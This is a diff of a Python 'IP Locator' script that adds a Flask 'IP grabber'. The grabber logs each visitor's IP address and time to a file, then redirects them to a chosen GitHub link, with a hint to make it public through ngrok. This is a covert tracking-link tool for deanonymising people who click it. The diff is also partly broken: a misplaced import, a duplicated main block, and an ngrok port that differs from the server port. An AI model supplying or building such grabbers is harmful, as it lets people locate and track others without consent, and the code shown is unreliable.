@@ -34,12 +34,15 @@ def show_splash():
     
 if __name__ == "__main__":
     show_splash()
-import requests
+    import requests
 import socket
+import datetime
 from urllib.parse import urlparse
+from flask import Flask, request, redirect
+
+# --- HELPER FUNCTIONS ---
 
 def get_location_data(ip):
-    """Fetches geolocation data for a given IP."""
     url = f"http://ip-api.com/json/{ip}"
     try:
         response = requests.get(url)
@@ -48,9 +51,8 @@ def get_location_data(ip):
         return {"status": "fail", "message": str(e)}
 
 def print_details(data):
-    """Formats and prints the IP metadata."""
     if data.get("status") == "success":
-        print("\n📍 IP/Host Location Details:")
+        print("\n📍 IP Location Details:")
         print(f"IP Address : {data['query']}")
         print(f"Country    : {data['country']}")
         print(f"Region     : {data['regionName']}")
@@ -59,56 +61,79 @@ def print_details(data):
         print(f"Lat/Lon    : {data['lat']}, {data['lon']}")
     else:
         print(f"❌ Error: {data.get('message', 'Invalid IP or Host')}")
-        
+
+# --- OPTION 2: TRACK EXISTING LINK ---
+
 def track_link_and_redirect():
-    """Simulates 'Grabify' logic: Get IP from a domain and verify the end link."""
-    link = input("\nEnter the URL to track (e.g., github.com/user/repo): ").strip()
-    
-    # Clean the URL to extract the hostname
+    link = input("\nEnter the URL to analyze (e.g., google.com): ").strip()
     if not link.startswith(('http://', 'https://')):
         link = 'https://' + link
-    
     try:
         hostname = urlparse(link).hostname
-        print(f"🔍 Analyzing host: {hostname}")
-
-        # 1. Get the IP address of the domain (DNS Lookup)
+        print(f"🔍 Resolving Host: {hostname}")
         ip_address = socket.gethostbyname(hostname)
-
-        # 2. Get Geolocation of that IP
         data = get_location_data(ip_address)
         print_details(data)
-
-        # 3. Reachable Check (Simulating the 'redirect' to the end link)
-        print(f"\n🔗 Attempting to reach final destination: {link}")
-        response = requests.get(link, timeout=10)
-
-        if response.status_code == 200:
-            print(f"✅ Success! Destination is reachable (Status: {response.status_code})")
-        else:
-            print(f"⚠️ Warning: Destination returned status code {response.status_code}")
-
-    except socket.gaierror:
-        print("❌ Error: Could not resolve hostname. Check the link.")
     except Exception as e:
-        print(f"❌ Connection error: {e}")
+        print(f"❌ Error: {e}")
+
+# --- OPTION 3: GENERATE GRABBER LINK (FLASK) ---
+
+app = Flask(__name__)
+TARGET_GITHUB = "" # Will be set by user input
+
+@app.route('/')
+def grab_ip():
+    # Capture visitor's IP
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    # Save to log file
+    with open("log.txt", "a") as f:
+        f.write(f"[{timestamp}] IP: {visitor_ip}\n")
+    
+    print(f"🚩 Captured IP: {visitor_ip} at {timestamp}")
+    return redirect(TARGET_GITHUB)
+
+def start_grabber_server():
+    global TARGET_GITHUB
+    TARGET_GITHUB = input("Enter the destination link (e.g., your GitHub repo URL): ")
+    if not TARGET_GITHUB.startswith('http'):
+        TARGET_GITHUB = 'https://' + TARGET_GITHUB
+    
+    print("\n🚀 IP Grabber is starting...")
+    print("⚠️  To make this public, run 'ngrok http 5000' in a separate terminal.")
+    print("❌ Press CTRL+C to stop the server and return to menu.\n")
+    
+    # Run the Flask server
+    app.run(host='127.0.0.1', port=7737)
+
+# --- MAIN MENU ---
 
 if __name__ == "__main__":
     while True:
-        print("\n--- IP Tracker ---")
+        print("\n" + "="*30)
+        print("  IP LOCATOR ")
+        print("="*30)
         print("1. Track a specific IP address")
-        print("2. Track IP from a Link ")
-        print("3. Exit")
-
+        print("2. Track IP of an existing Website")
+        print("3. Create a Link")
+        print("4. Exit")
+        
         choice = input("\nSelect an option: ")
-
+        
         if choice == '1':
-            ip = input("Enter IP address to track: ")
-            data = get_location_data(ip)
-            print_details(data)
+            ip = input("Enter IP to track: ")
+            print_details(get_location_data(ip))
         elif choice == '2':
             track_link_and_redirect()
         elif choice == '3':
+            try:
+                start_grabber_server()
+            except KeyboardInterrupt:
+                print("\nServer stopped. Returning to menu...")
+        elif choice == '4':
+            print("Goodbye!")
             break
         else:
             print("Invalid selection.")
